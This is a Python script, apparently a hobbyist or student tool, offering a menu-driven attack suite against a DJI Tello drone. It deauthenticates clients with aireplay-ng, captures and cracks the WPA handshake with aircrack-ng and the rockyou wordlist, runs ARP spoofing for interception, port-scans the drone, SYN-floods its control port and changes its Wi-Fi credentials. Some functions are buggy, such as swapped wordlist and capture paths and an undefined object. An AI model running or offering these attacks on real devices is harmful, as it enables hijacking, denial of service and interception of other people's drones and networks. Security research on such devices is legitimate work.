from djitellopy import *
import keyboard
import socket
import sys
import cv2
import os
import subprocess
import multiprocessing as mp
import time
import math
import ipaddress
import netifaces
import threading
import logging
from scapy.all import *

#Global variables for use in multiple functions

bssid = None
dronechannel = None
essid = None
dronepass = None
drone = Tello()

#drone name is TELLO-JC
#drone MAC Address is 48:1C:B9:98:DA:29

#Set up logging
logging.basicConfig(filename='arpspoof.log', level=logging.INFO, format='%(asctime)s:%(levelname)s:%(message)s')


def deauth(bssid): # sends deauthentication command to target BSSID
    cmd = ['sudo', 'qterminal', '-e', 'aireplay-ng', '--deauth', '25', '-a', bssid, 'wlan0mon']
    subprocess.run(cmd)
    

def capture_handshake(bssid, channel): # 
    output_dir = 'tellohackcrack'
    output_file = os.path.join(output_dir, 'capture')
    cmd = ['sudo', 'airodump-ng', '-w', output_file, '-c', channel, '--bssid', bssid, 'wlan0mon']
    process = subprocess.Popen(cmd)
    process.wait()

def wifi_capture():
    try:
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], stdout=subprocess.PIPE)
        p2 = subprocess.run(['sudo', 'airmon-ng', 'start', 'wlan0'], stdout=subprocess.PIPE)
        print(p2.stdout.decode())
        logging.info('Started monitoring mode on wlan0.')
        
        subprocess.run(['sudo', 'airodump-ng', 'wlan0mon'])
        
        bssid = input('Enter the MAC address of the drone: ')
        dronechannel = input('Enter the channel to use: ')
        
        # Start deauthentication attack in a new thread.
        deauth_thread = threading.Thread(target=deauth, args=(bssid,))
        deauth_thread.start()
        
        # Start capturing handshake in main thread.
        capture_handshake(bssid, dronechannel)
        logging.info('Finished capturing handshake.')
        
        #Start cracking password

        dir_path = "rockyou.txt"  # wordlist location

        # Search for the capture file with the largest numerical value in its filename
        max_num = 0
        max_file = ''
        for file in os.listdir(dir_path):
            if file.startswith("capture-") and file.endswith(".cap"):
                num = int(file.split("-")[1])
                if num > max_num:
                    max_num = num
                    max_file = file

        # Run the aircrack-ng command for the capture file with the largest numerical value and known BSSID
        if max_file:
            cmd = ['sudo', 'aircrack-ng', '-a2', '-b', bssid, '-w', '/tellohackcrack', os.path.join(dir_path, max_file)]
            subprocess.run(cmd)
        else:
            print("No capture file found.")
          
                
    except Exception as e:
        logging.error(f'Error during capture: {e}\n')
        print(f'Error: {e}')
    
    finally:
        main()
        
def passcrack():
    global bssid
    dir_path = "tellohackcrack"  # capture file location
    
    # Check if bssid already has a value
    try:
        if bssid is None:
            # Prompt user for input if bssid is None
            while bssid is None:
                try:
                    bssid = input("Please enter the BSSID of the target network: ")
                except ValueError:
                    print("Invalid BSSID. Please try again.")
        else:
            print("Attempting to crack password for", bssid)  
    except Exception as e:
        print(f"Error: {e}")
        logging.error(f'Error with BSSID: {e}')

    
    # Check if dir_path exists
    if not os.path.exists(dir_path):
        print("Error: directory does not exist")
        return
    
    try:
        # Search for the capture file with the largest numerical value in its filename
        max_num = 0
        max_file = ''
        for file in os.listdir(dir_path):
            if file.startswith("capture-") and file.endswith(".cap"):
                num_str = file.split("-")[1].split(".")[0]  # extract the numerical part of the filename
                try:
                    num = int(num_str)
                except ValueError:
                    # skip files that do not have a valid numerical part in the filename
                    continue
                if num > max_num:
                    max_num = num
                    max_file = file

        # Run the aircrack-ng command for the capture file with the largest numerical value and known BSSID
        if max_file:
            cmd = ['sudo', 'aircrack-ng', '-a2', '-b', bssid, '-w', 'rockyou.txt', os.path.join(dir_path, max_file)]
            subprocess.run(cmd)
        else:
            print("No capture file found.")
                
    except Exception as e:
        print(f"Error: {e}")
        logging.error(f'Error during cracking: {e}')
    
    finally:
        main()

# Resets network manager and cancels wlan0mo, connects user to target access point using entered details
def connectAP():
    subprocess.run(['sudo', 'service', 'NetworkManager', 'restart'], stdout=subprocess.PIPE)
    logging.info('Restarted NetworkManager.')
    subprocess.run(['sudo', 'airmon-ng', 'stop', 'wlan0mon'], stdout=subprocess.PIPE)
    logging.info('Stopped monitor mode on wlan0mon.')
    subprocess.run(['sudo', 'ifconfig', 'wlan0', 'up'], stdout=subprocess.PIPE)
    logging.info('Turned on wlan0.')
    essid = input("\nEnter drone ESSID: ")
    dronepass = input("\nEnter drone password: ")
    subprocess.run(['sudo', 'nmcli', 'dev', 'wifi', 'connect', essid, 'password', dronepass], stdout=subprocess.PIPE)
    logging.info(f'Connected to {essid} with password {dronepass}.')
    subprocess.run(['sudo', 'clear'], stdout=subprocess.PIPE)
    main()

# Changes Wi-FI credentials of the drone using input from the user
def change_wifi():
    print("Change Wi-Fi credentials:")
    try:
        # Prompt user for new SSID and password
        ssid = input("\nEnter new SSID for Drone: ")
        password = input("\nEnter new password for Drone: ")
        
        # Use the Tello module to set the new credentials
        tello.set_wifi_credentials(ssid=ssid, password=password)
        print("Wi-Fi credentials updated successfully!")
    except tello.TelloError as e:
        print(f"Error changing Wi-Fi credentials: {e}")

# Connects device to the drone, called by main; if connect returns true, tello_control will execute
def connect(drone):
    try:
        drone.connect()
    except Exception as e:
        print("Error connecting to drone:", str(e))
    return True

# Makes the drone takeoff
def takeoff(drone):
    try:
        drone.takeoff()
        return True
    except Exception as e:
        print("Error taking off:", str(e))
        return True

# Makes the drone LAN
def land(drone):
    try:
        drone.land()
    except Exception as e:
        print("Error landing:", str(e))
        
# Displays video from the drone
def display_video(drone):
    while True:
        frame = drone.get_frame_read().frame
        cv2.imshow("Tello Video Feed", frame)
        cv2.waitKey(1)

# FUnction for controlling the drone; displays video from the drone and takes input from the user for directions
def tello_control(drone):
    
    drone.connect()
    drone.streamon()

    # start video display thread
    video_thread = threading.Thread(target=display_video, args=(drone,))
    video_thread.start()

    takeoff(drone)
    
    # enter control loop
    print("Tello controls")
    print("Enter 'q' to land and quit")
    print("Enter 'w', 'a', 's', or 'd' to move forward, left, backward, or right")
    print("Enter 'u' or 'j' to move up or down")
    print("Enter 'e' or 'r' to rotate clockwise or counterclockwise")
    print("Enter 'takeoff' or 'tkf' to land and end controls")
    while True:
        try:
            command = input("Enter a command: ")
            if command == "q":
                drone.land()
                break
            elif command == "w":
                try:
                    drone.move_forward(50)
                except Exception as e:
                    print("Error:", e)
            elif command == "a":
                try:
                    drone.move_left(50)
                except Exception as e:
                    print("Error:", e)
            elif command == "s":
                try:
                    drone.move_back(50)
                except Exception as e:
                    print("Error:", e)
            elif command == "d":
                try:
                    drone.move_right(50)
                except Exception as e:
                    print("Error:", e)
            elif command == "u":
                try:
                    drone.move_up(50)
                except Exception as e:
                    print("Error:", e)
            elif command == "j":
                try:
                    drone.move_down(50)
                except Exception as e:
                    print("Error:", e)
            elif command == "e":
                try:
                    drone.rotate_clockwise(90)
                except Exception as e:
                    print("Error:", e)
            elif command == "r":
                try:
                    drone.rotate_counter_clockwise(90)
                except Exception as e:
                    print("Error:", e)
            elif command == "takeoff" or command == "tkf":
                drone.takeoff()
            elif command == "end":
                drone.land()
                drone.end()
            else:
                print("Invalid command")
        except KeyboardInterrupt:
            drone.connect()

    # cleanup - close video and end drone control
    drone.streamoff()
    cv2.destroyAllWindows()
    video_thread.join()
    drone.end()

def disconnect(drone): # End connecting to drone
    try:
        drone.end()
    except Exception as e:
        print("Error disconnecting from drone:", str(e))
    
def enable_ip_forward(): # ends IP forwarding
    subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'], stdout=subprocess.PIPE)

def start_arpspoof():
    # Read in configuration file
    try:
        with open('config.txt', 'r') as f:
            config = f.read().splitlines()
            interface = config[0]
            target_ip = config[1]
            gateway_ip = config[2]
    except Exception as e:
        logging.error(f"Error reading configuration file: {e}")
        print(f"Error reading configuration file: {e}")
        exit()

    # Validate IP addresses
    try:
        target_ip = ipaddress.IPv4Address(target_ip)
        gateway_ip = ipaddress.IPv4Address(gateway_ip)
    except Exception as e:
        logging.error(f"Invalid IP address: {e}")
        print(f"Invalid IP address: {e}")
        exit()

    # Check that the interface exists
    if interface not in netifaces.interfaces():
        logging.error(f"Interface {interface} does not exist")
        print(f"Interface {interface} does not exist")
        exit()

    # Get the IP address of the specified interface
    interface_address = get_interface_address(interface)
    if interface_address is None:
        exit()

    # Enable IP forwarding
    enable_ip_forward()

    # Start the arpspoof processes using threads
    stop_flag = threading.Event()
    t1 = threading.Thread(target=run_arpspoof, args=(interface, target_ip, gateway_ip, stop_flag))
    t2 = threading.Thread(target=run_arpspoof, args=(interface, gateway_ip, target_ip, stop_flag))
    t1.start()
    t2.start()

    # Wait for the user to stop the arpspoof processes
    print(f"Started arpspoof on interface {interface} ({interface_address})")
    print(f"Target IP: {target_ip}, Gateway IP: {gateway_ip}")
    print("Press enter to stop the arpspoof processes...")
    input()

    # Stop the arpspoof processes
    stop_flag.set()
    t1.join()
    t2.join()
    print("Arpspoof processes stopped\n")
    main()

def run_arpspoof(interface, target_ip, gateway_ip, stop_flag): #runs actual arpspoof commands, used via threading by def start_arpspoof
    try:
        while not stop_flag.is_set():
            subprocess.call(['sudo', 'qterminal', '-e', 'sudo', 'arpspoof', '-i', str(interface), '-t', str(gateway_ip), str(target_ip)], stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    except Exception as e:
        logging.error(f"Error running arpspoof: {e}")
        print(f"Error running arpspoof: {e}")
        return

def get_interface_address(interface):
    try:
        # Get the IP address of the specified interface
        addresses = netifaces.ifaddresses(interface)
        ipv4_address = addresses[netifaces.AF_INET][0]['addr']
        return ipv4_address
    except Exception as e:
        logging.error(f"Error getting IP address for interface {interface}: {e}")
        print(f"Error getting IP address for interface {interface}: {e}")
        return None

def nmap_scan():
    # Check if host is up
    host_up = subprocess.run(['ping', '-c', '1', '192.168.10.1'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if host_up.returncode != 0:
        logging.error("Error: Tello drone is not online or this device is not connected to it")
        print("Error: Tello drone is not online or this device is not connected to it\n")
        main()
        return
    try:
        # Run nmap scan on Tello drone
        subprocess.call(['sudo', 'nmap', '-p-', '-sV', '192.168.10.1'], stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    except Exception as e:
        logging.error(f"Error running nmap scan: {e}")
        print(f"Error running nmap scan: {e}")
        main()
        return

#FLoods drone with SYN packets to attempt denial of service
def dos_attack():
    try:
        # Gateway used by the tello drone
        target_ip = "192.168.10.1"

        # Craft a TCP SYN packet
        syn_pkt = IP(dst=target_ip)/TCP(dport=8889, flags="S")
        
        # Send the packet in a loop
        send(syn_pkt, loop=True)
        main()
    except Exception as e:
        logging.error(f"Error with DoS attack: {e}")
        print(f"Error with DoS attack: {e}\n")
        main()
        return
    
def main():
        
    if __name__ == '__main__':
        
        # Connect to the drone
        drone = Tello()
        print("Choose an option")
        print("1 - Capture WPA handshake")
        print("2 - Crack password")
        print("3 - Connect to drone")
        print("4 - Control drone")
        print("5 - Begin ARP Spoofing")
        print("6 - Port scan")
        print("7 - DoS Attack")
        print("8 - Change drone Wi-Fi details")
        print("0 - Exit")

        while True:
            try:
                choice = int(input("\nEnter: "))
                while choice > 8 or choice < 0:
                    print("Invalid option – please re-enter")
                    choice = int(input("Choose an option "))
                break
            except ValueError:
                print("Invalid input, please enter a numerical value ")	
            
        if choice == 1:
            wifi_capture()

        elif choice == 2:
            passcrack()
            
        elif choice == 3:
            connectAP()

        elif choice == 4:
            if connect(drone):
                tello_control(drone)
            disconnect(drone)

        elif choice == 5:
            start_arpspoof()
        
        elif choice == 6:
            nmap_scan()
            
        elif choice == 7:
            dos_attack()

        elif choice == 8:
            change_wifi()
            
        elif choice == 0:
            exit()	
            
        else:
            print ("Invalid input\n")
            main()

main()